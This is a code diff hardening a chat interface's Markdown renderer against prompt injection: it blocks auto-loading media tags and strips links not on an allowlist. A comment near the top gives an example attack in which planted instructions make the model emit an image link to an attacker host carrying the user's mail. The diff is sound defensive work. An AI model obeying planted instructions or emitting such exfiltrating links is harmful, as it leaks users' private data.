@@ -340,13 +340,36 @@ const CITE_CSS = `
  * Render markdown (marked + DOMPurify). `[n]` citations become buttons: `resolveCite(n)` returns a
  * message id (or a MessageLite) to open; `[msg:<id>]` opens that message directly.
  */
-export function Markdown({ text, resolveCite, onCite, style }) {
-  const html = useMemo(() => {
-    let raw;
-    try { raw = marked.parse(String(text || ''), { gfm: true, breaks: true, async: false }); } catch { raw = ''; }
-    const withCites = linkifyCitations(raw).replace(/<a /g, '<a target="_blank" rel="noopener noreferrer" ');
-    return DOMPurify.sanitize(withCites, { ADD_ATTR: ['target', 'data-cite', 'data-msg'] });
-  }, [text]);
+// Model text over mail and web pages can carry instructions planted there. Nothing it writes may
+// load on its own: an injected ![](https://attacker/?q=<your mail>) would send the mail out the
+// moment the answer renders, so media and embedding tags never survive.
+const NO_LOAD_TAGS = ['img', 'picture', 'source', 'video', 'audio', 'track', 'iframe', 'frame', 'object', 'embed', 'svg', 'math', 'link', 'meta', 'style', 'form', 'input', 'button', 'base'];
+const ANCHOR_RE = /<a\b([^>]*)>([\s\S]*?)<\/a>/gi;
+
+/**
+ * Model Markdown as safe HTML: citations become buttons, links open in a new tab, nothing loads by
+ * itself. `links`: when given, only links to these exact URLs stay links (the web pages an answer
+ * cites); any other link the model wrote is shown as its text. Pure (DOMPurify).
+ */
+export function markdownHtml(text, { links = null } = {}) {
+  let raw;
+  try { raw = marked.parse(String(text || ''), { gfm: true, breaks: true, async: false }); } catch { raw = ''; }
+  // Sanitised before the citation buttons go in, so the model cannot write buttons of its own.
+  let clean = DOMPurify.sanitize(raw, { FORBID_TAGS: NO_LOAD_TAGS, FORBID_ATTR: ['style', 'srcset', 'background', 'poster'] });
+  if (Array.isArray(links)) {
+    const allowed = new Set(links.map(String));
+    clean = clean.replace(ANCHOR_RE, (whole, attrs, inner) => {
+      const href = /\bhref="([^"]*)"/i.exec(attrs)?.[1]?.replace(/&amp;/g, '&');
+      return href && allowed.has(href) ? whole : inner;
+    });
+  }
+  const withCites = linkifyCitations(clean).replace(/<a /g, '<a target="_blank" rel="noopener noreferrer" ');
+  return DOMPurify.sanitize(withCites, { ADD_ATTR: ['target', 'data-cite', 'data-msg'], FORBID_TAGS: NO_LOAD_TAGS.filter((t) => t !== 'button') });
+}
+
+export function Markdown({ text, resolveCite, onCite, style, links = null }) {
+  const key = Array.isArray(links) ? links.join('\n') : null;
+  const html = useMemo(() => markdownHtml(text, { links }), [text, key]); // eslint-disable-line react-hooks/exhaustive-deps
 
   const onClick = (e) => {
     const el = e.target.closest?.('[data-cite],[data-msg]');
